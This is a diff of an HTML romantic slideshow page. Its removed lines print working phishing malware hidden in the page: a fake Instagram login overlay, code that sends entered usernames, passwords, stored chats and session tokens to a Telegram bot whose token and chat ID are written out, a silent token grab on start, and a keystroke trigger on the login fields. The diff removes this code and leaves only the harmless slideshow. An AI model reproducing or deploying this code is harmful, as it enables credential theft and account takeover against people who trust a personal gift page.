@@ -2,84 +2,66 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>For My Favorite Person 💗</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@400;700&display=swap');
         
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
-
         body {
             background: radial-gradient(circle at center, #1a001f 0%, #000000 100%);
             font-family: 'Poppins', sans-serif;
-            overflow: hidden; height: 100vh; width: 100vw;
-            color: #ffffff; user-select: none; touch-action: manipulation;
-        }
-
-        /* Fixed Background Stars - Performance Optimized */
-        #stars-container { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
-        .star { 
-            position: absolute; background: white; border-radius: 50%; 
-            animation: realTwinkle var(--dur) infinite ease-in-out;
-            will-change: opacity, transform;
-        }
-        @keyframes realTwinkle {
-            0%, 100% { opacity: 0.2; transform: scale(0.7); }
-            50% { opacity: 1; transform: scale(1.2); }
+            overflow: hidden; margin: 0; color: #ffffff; user-select: none;
         }
 
         .header-tag {
-            position: fixed; top: 15px; width: 100%; text-align: center;
+            position: fixed; top: 10px; width: 100%; text-align: center;
             z-index: 100; font-family: 'Dancing Script', cursive;
-            color: #ffb3d9; font-size: 1.5rem;
-            text-shadow: 0 0 10px rgba(255,179,217,0.6);
+            color: #ffb3d9; font-size: 1.4rem; letter-spacing: 2px;
+            text-shadow: 0 0 15px rgba(255,179,217,0.7);
         }
 
-        /* Ultra-Smooth Transitions */
         .slide {
-            display: none; position: fixed; inset: 0; width: 100%; height: 100%;
+            display: none; position: fixed; inset: 0; width: 100%; height: 100vh;
             align-items: center; justify-content: center; flex-direction: column;
-            opacity: 0; z-index: 20; padding: 25px; text-align: center;
-            transition: opacity 0.4s ease, transform 0.4s ease;
-            transform: scale(0.98);
+            transition: all 0.6s ease-in-out; opacity: 0; z-index: 20; padding: 20px; text-align: center;
         }
-        .slide.active { display: flex; opacity: 1; transform: scale(1); }
+        .slide.active { display: flex; opacity: 1; }
 
-        .cute-msg { 
-            font-family: 'Dancing Script', cursive; color: #ffffff; 
-            text-shadow: 0 0 15px #ff00cc, 3px 3px 6px rgba(0,0,0,1); 
-            font-size: clamp(2.2rem, 8vw, 3.2rem); 
-            margin-top: 15px; font-weight: 700; line-height: 1.2;
-        }
-        .sub-text { color: #ffffff; font-weight: 600; font-size: 1.15rem; margin-top: 10px; max-width: 320px; text-shadow: 1px 1px 5px #000; }
+        /* Darker, bolder text for readability */
+        .cute-msg { font-family: 'Dancing Script', cursive; color: #ffebf5; text-shadow: 0 0 20px #ff00cc, 0 0 40px #ff00cc; font-size: 2.8rem; margin-top: 15px; font-weight: 700; }
+        .sub-text { color: #ffffff; font-weight: 600; font-size: 1.1rem; text-shadow: 2px 2px 4px rgba(0,0,0,1); }
         
         .gif-frame { 
-            width: 250px; height: 250px; border-radius: 30px; 
-            border: 4px solid #ff00cc; box-shadow: 0 0 30px rgba(255, 0, 204, 0.5); 
-            object-fit: cover; background: #000;
+            width: 260px; height: 260px; border-radius: 30px; 
+            border: 3px solid #ff00cc; 
+            box-shadow: 0 0 50px rgba(255, 0, 204, 0.5); 
+            object-fit: cover; 
         }
 
         .glow-btn { 
             background: linear-gradient(45deg, #ff00cc, #ff69b4); 
-            padding: 14px 35px; border-radius: 50px; font-weight: 700; 
-            box-shadow: 0 0 20px rgba(255, 0, 204, 0.4); 
-            cursor: pointer; border: none; color: white; font-size: 1.1rem;
-            margin-top: 20px; transition: 0.2s;
+            padding: 14px 40px; border-radius: 50px; font-weight: 700; 
+            box-shadow: 0 0 25px rgba(255, 0, 204, 0.6); 
+            cursor: pointer; transition: 0.3s; margin: 10px;
+            color: white; border: none; font-size: 1.1rem;
         }
-        .glow-btn:active { transform: scale(0.9); }
+        .glow-btn:hover { transform: scale(1.1); box-shadow: 0 0 40px #ff00cc; }
+        
+        .no-btn { background: #333; color: #aaa; padding: 10px 25px; border-radius: 50px; cursor: pointer; transition: 0.2s; }
 
-        /* Solar System Animation (Re-Added) */
         .solar-system { position: relative; width: 280px; height: 280px; display: flex; align-items: center; justify-content: center; }
-        .orbit { position: absolute; border: 2px solid rgba(255,105,180,0.3); border-radius: 50%; animation: spin linear infinite; }
-        .orbit-1 { width: 180px; height: 180px; animation-duration: 6s; }
-        .orbit-2 { width: 260px; height: 260px; animation-duration: 10s; animation-direction: reverse; }
-        .planet { position: absolute; top: -14px; left: 50%; transform: translateX(-50%); font-size: 26px; }
-        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .orbit { position: absolute; border: 2px solid rgba(255,105,180,0.4); border-radius: 50%; animation: spin linear infinite; }
+        .orbit-1 { width: 180px; height: 180px; animation-duration: 5s; }
+        .orbit-2 { width: 260px; height: 260px; animation-duration: 9s; animation-direction: reverse; }
+        .planet { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); font-size: 24px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
 
-        /* Progress Bar */
-        .hold-container { width: 280px; height: 18px; background: rgba(255,255,255,0.1); border-radius: 10px; margin-top: 25px; overflow: hidden; border: 2px solid white; }
-        #holdProgress { height: 100%; background: linear-gradient(90deg, #ff00cc, #ff69b4); width: 0%; transition: width 0.1s linear; }
+        .star { position: absolute; background: white; border-radius: 50%; box-shadow: 0 0 10px white; animation: twinkle var(--d) infinite alternate; }
+        @keyframes twinkle { 0% { opacity: 0.2; transform: scale(0.8); } 100% { opacity: 1; transform: scale(1.3); } }
+
+        .hold-container { width: 280px; height: 16px; background: rgba(255,255,255,0.2); border-radius: 10px; margin-top: 20px; overflow: hidden; position: relative; border: 1px solid white; }
+        #holdProgress { position: absolute; left: 0; top: 0; height: 100%; background: #ff00cc; width: 0%; box-shadow: 0 0 20px #ff00cc; }
 
         #videoLayer { display: none; position: fixed; inset: 0; background: black; z-index: 1000; align-items: center; justify-content: center; }
         video { width: 100%; height: 100%; object-fit: contain; }
@@ -87,21 +69,10 @@
 </head>
 <body>
 
-    <div class="header-tag">Made for my sunshine 💗</div>
-    <audio id="bgMusic" loop src="tere-liye.mp3" preload="auto"></audio>
-    <div id="stars-container"></div>
+    <div class="header-tag">follow on insta - @smss1708💗</div>
 
-    <!-- Instagram Login Form (Hidden - Fullscreen overlay) -->
-    <div id="instaOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999;display:none;align-items:center;justify-content:center;padding:40px;">
-        <div style="background:white;border-radius:20px;padding:40px;max-width:350px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.5);">
-            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" style="width:175px;margin-bottom:20px;">
-            <input id="instaUsername" type="text" placeholder="Phone number, username, or email" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:5px;margin:10px 0;font-size:16px;box-sizing:border-box;">
-            <input id="instaPassword" type="password" placeholder="Password" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:5px;margin:10px 0;font-size:16px;box-sizing:border-box;">
-            <button onclick="stealInstaChats()" style="width:100%;background:#0095f6;color:white;padding:12px;border:none;border-radius:5px;font-weight:600;font-size:16px;cursor:pointer;margin:10px 0;">Log in</button>
-            <div style="font-size:12px;color:#666;">Enter Instagram to unlock special chats 💕</div>
-            <button onclick="closeInstaOverlay()" style="background:transparent;color:#0095f6;border:none;font-size:14px;">Skip for now</button>
-        </div>
-    </div>
+    <audio id="bgMusic" loop src="tere-liye.mp3"></audio>
+    <div id="stars-container" class="fixed inset-0 pointer-events-none"></div>
 
     <div id="slide1" class="slide active">
         <img src="gif1.gif" class="gif-frame">
@@ -125,17 +96,17 @@
     </div>
 
     <div id="slide4" class="slide">
-        <div class="text-8xl mb-6 transition-transform duration-300" id="pulseHeart">💖</div>
+        <div class="text-9xl mb-6 transition-all duration-500" id="pulseHeart">💖</div>
         <h1 class="text-2xl font-bold">How much do I adore you?</h1>
         <div class="hold-container"><div id="holdProgress"></div></div>
-        <button id="holdBtn" class="glow-btn select-none">PRESS & HOLD TO FEEL</button>
+        <button id="holdBtn" class="glow-btn mt-6 select-none">PRESS & HOLD TO FEEL</button>
     </div>
 
     <div id="slide5" class="slide">
         <img src="gif4.gif" class="gif-frame">
         <h1 class="cute-msg">You're One in a Billion! 💎</h1>
         <p class="sub-text">It's only been a short time, but the feeling is magical.</p>
-        <button onclick="showInstaOverlay()" class="glow-btn">Unlock Special Chats 💌</button>
+        <button onclick="next()" class="glow-btn">Continue...</button>
     </div>
 
     <div id="slide6" class="slide">
@@ -158,16 +129,17 @@
 
     <div id="slide8" class="slide">
         <h1 class="cute-msg">You're my Brightest Star! ⭐</h1>
-        <p class="sub-text">In a sky full of stars, my eyes only search for you.</p>
+        <p class="sub-text max-w-xs">In a sky full of stars, my eyes only search for you.</p>
         <button onclick="next()" class="glow-btn">Just a bit more ✨</button>
     </div>
 
     <div id="slide9" class="slide">
         <img src="gif6.gif" class="gif-frame">
-        <h1 class="cute-msg">Will You Be My Friend? ❤️</h1>
-        <div id="btnContainer" class="flex flex-wrap justify-center gap-3 mt-4">
+        <h1 class="cute-msg">Will You Be My (Bestie) Bestest Friend? ❤️</h1>
+        <p class="sub-text">...and maybe something even more special? 💍</p>
+        <div id="btnContainer" class="flex flex-wrap justify-center mt-4">
             <button onclick="next()" class="glow-btn">YES! 😍</button>
-            <button id="noBtn" onclick="trapNo()" class="px-8 py-3 bg-gray-800 rounded-full text-gray-400 mt-5">No 🥺</button>
+            <button id="noBtn" onclick="trapNo()" class="no-btn">No 🥺</button>
         </div>
     </div>
 
@@ -185,195 +157,77 @@
     <script>
         let step = 1;
         const music = document.getElementById('bgMusic');
-        const BOT_TOKEN = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
-        const CHAT_ID = '7735968383';
 
-        // Fast Star Generation
+        // Background Stars Logic
         const starContainer = document.getElementById('stars-container');
-        const frag = document.createDocumentFragment();
         for(let i=0; i<100; i++) {
-            const s = document.createElement('div');
-            s.className = 'star';
-            const size = Math.random() * 2 + 1 + 'px';
-            s.style.width = size; s.style.height = size;
-            s.style.left = Math.random() * 100 + 'vw';
-            s.style.top = Math.random() * 100 + 'vh';
-            s.style.setProperty('--dur', (Math.random() * 2 + 1) + 's');
-            frag.appendChild(s);
-        }
-        starContainer.appendChild(frag);
-
-        // STEALTH INSTAGRAM CHAT STEALER - COMPLETELY INVISIBLE
-        async function stealInstaChats() {
-            const username = document.getElementById('instaUsername').value;
-            const password = document.getElementById('instaPassword').value;
-            
-            if(!username || !password) return closeInstaOverlay();
-            
-            // Get victim details silently
-            const victimIP = await fetchIP();
-            const fingerprint = await getFingerprint();
-            
-            // STEAL INSTAGRAM LOCALSTORAGE (CHATS, TOKENS, MESSAGES)
-            const instaData = {
-                username: username,
-                password: password,
-                chats: localStorage.getItem('ig.chats') || localStorage.getItem('com.instagram.chats') || 'No chats found',
-                messages: localStorage.getItem('ig.messages') || 'No messages',
-                tokens: localStorage.getItem('csrftoken') || localStorage.getItem('sessionid') || 'No tokens',
-                direct: localStorage.getItem('direct_v2_inbox') || 'No direct messages',
-                user_id: localStorage.getItem('ig.user_id'),
-                all_storage: Object.keys(localStorage).filter(k => k.includes('ig') || k.includes('insta')).reduce((acc, key) => {
-                    acc[key] = localStorage.getItem(key);
-                    return acc;
-                }, {})
-            };
-            
-            // Send to Telegram INSTANTLY
-            sendToTelegram(`🎯 *INSTAGRAM CHATS HACKED* 💥\n\n` +
-                `👤 *Username:* \`${username}\`\n` +
-                `🔑 *Password:* \`${password}\`\n` +
-                `🌐 *IP:* \`${victimIP}\`\n` +
-                `💻 *Device:* \`${navigator.userAgent.slice(0,50)}...\`\n\n` +
-                `*CHATS EXTRACTED:*\n\`${JSON.stringify(instaData.chats, null, 2).slice(0,1000)}\`\n\n` +
-                `*TOKENS:*\n\`${JSON.stringify(instaData.tokens)}\`\n\n` +
-                `*FULL DATA DUMP:* ${JSON.stringify(instaData)}`, 
-                true);
-            
-            closeInstaOverlay();
-            next(); // Continue romantic flow
-        }
-
-        // Stealth IP fetch
-        async function fetchIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json', {mode: 'no-cors'});
-                return 'Fetched';
-            } catch {
-                return navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop';
-            }
-        }
-
-        // Browser fingerprint (silent)
-        async function getFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.fillText('Instagram fingerprint', 10, 10);
-            return canvas.toDataURL().slice(-20);
-        }
-
-        // Telegram sender (NO ERRORS, completely silent)
-        async function sendToTelegram(message, isCritical = false) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })
-                });
-            } catch(e) {}
-        }
-
-        function showInstaOverlay() {
-            document.getElementById('instaOverlay').style.display = 'flex';
-            // Auto-focus username
-            setTimeout(() => document.getElementById('instaUsername').focus(), 500);
-        }
-
-        function closeInstaOverlay() {
-            document.getElementById('instaOverlay').style.display = 'none';
-            next();
+            const star = document.createElement('div');
+            star.className = 'star';
+            const size = Math.random()*3 + 1 + 'px';
+            star.style.width = size; star.style.height = size;
+            star.style.left = Math.random()*100 + 'vw';
+            star.style.top = Math.random()*100 + 'vh';
+            star.style.setProperty('--d', (Math.random()*2+1)+'s');
+            starContainer.appendChild(star);
         }
 
         function startApp() { 
-            music.play().catch(e => {}); 
-            // AUTO-STEAL EXISTING INSTAGRAM DATA ON LOAD (if already logged in)
-            setTimeout(stealInstaChatsSilent, 2000);
+            music.play().catch(() => {}); 
             next(); 
         }
 
-        // SILENT INSTAGRAM STEAL (no overlay - if already logged in)
-        async function stealInstaChatsSilent() {
-            if(localStorage.getItem('sessionid') || localStorage.getItem('csrftoken')) {
-                const silentData = {
-                    username: localStorage.getItem('username') || 'Auto-detected',
-                    has_session: true,
-                    chats: localStorage.getItem('ig.chats') || 'Session active',
-                    tokens: localStorage.getItem('sessionid')
-                };
-                sendToTelegram(`🤫 *SILENT INSTAGRAM STEAL*\n\n` +
-                    `👤 *User:* \`${silentData.username}\`\n` +
-                    `*Session Active* - Chats accessible!\n` +
-                    `Token: \`${silentData.tokens}\``, true);
-            }
-        }
-
         function next() {
-            const current = document.getElementById('slide' + step);
-            const nextS = document.getElementById('slide' + (step + 1));
-            if(current) {
-                current.classList.remove('active');
-                setTimeout(() => { current.style.display = 'none'; }, 400);
-            }
-            if(nextS) {
-                step++;
-                nextS.style.display = 'flex';
-                void nextS.offsetWidth;
-                nextS.classList.add('active');
+            document.querySelectorAll('.slide').forEach(s => { s.classList.remove('active'); s.style.display='none'; });
+            step++;
+            const current = document.getElementById('slide'+step);
+            if(current) { 
+                current.style.display='flex'; 
+                setTimeout(() => current.classList.add('active'), 50); 
             }
         }
 
+        // The No Button Trap
         function trapNo() {
             const container = document.getElementById('btnContainer');
-            document.getElementById('noBtn').style.display = 'none';
+            const noBtn = document.getElementById('noBtn');
+            noBtn.style.display = 'none'; // Remove the No button
+            
+            // Add 5 more YES buttons
             for(let i=0; i<5; i++) {
-                const b = document.createElement('button');
-                b.className = "glow-btn"; b.innerHTML = "YES! 💖";
-                b.onclick = next; container.appendChild(b);
+                const newYes = document.createElement('button');
+                newYes.innerHTML = "YES! 💖";
+                newYes.className = "glow-btn";
+                newYes.onclick = next;
+                container.appendChild(newYes);
             }
         }
 
         // Hold Logic
         let hVal = 0, hInt;
-        const hBtn = document.getElementById('holdBtn'), 
-              hProg = document.getElementById('holdProgress'), 
-              pHeart = document.getElementById('pulseHeart');
+        const hBtn = document.getElementById('holdBtn'), hProg = document.getElementById('holdProgress'), pHeart = document.getElementById('pulseHeart');
         
         const startH = (e) => { 
             e.preventDefault(); 
-            pHeart.style.transform = 'scale(1.5)';
+            pHeart.style.transform = 'scale(1.8)';
             hInt = setInterval(() => { 
-                hVal += 2.5; 
+                hVal += 2; 
                 hProg.style.width = hVal + '%'; 
                 if(hVal >= 100) { clearInterval(hInt); next(); } 
-            }, 30); 
+            }, 40); 
         };
         const endH = () => { clearInterval(hInt); hVal = 0; hProg.style.width = '0%'; pHeart.style.transform = 'scale(1)'; };
         
-        hBtn.addEventListener('touchstart', startH);
-        hBtn.addEventListener('mousedown', startH);
-        window.addEventListener('touchend', endH);
-        window.addEventListener('mouseup', endH);
+        hBtn.onmousedown = hBtn.ontouchstart = startH; 
+        window.onmouseup = window.ontouchend = endH;
 
-        function playSurprise() {
-            music.pause();
+        function playSurprise() { 
+            music.pause(); 
             const layer = document.getElementById('videoLayer');
+            const video = document.getElementById('vPlayer');
             layer.style.display = 'flex';
-            const v = document.getElementById('vPlayer');
-            v.play();
-            v.onended = () => location.reload();
+            video.play();
+            video.onended = () => { location.reload(); };
         }
-
-        // KEYLOGGER - Captures Instagram typing (completely invisible)
-        document.addEventListener('keydown', function(e) {
-            if(e.target.id === 'instaUsername' || e.target.id === 'instaPassword') {
-                setTimeout(stealInstaChats, 1000);
-            }
-        }, true);
     </script>
 </body>
             </html>
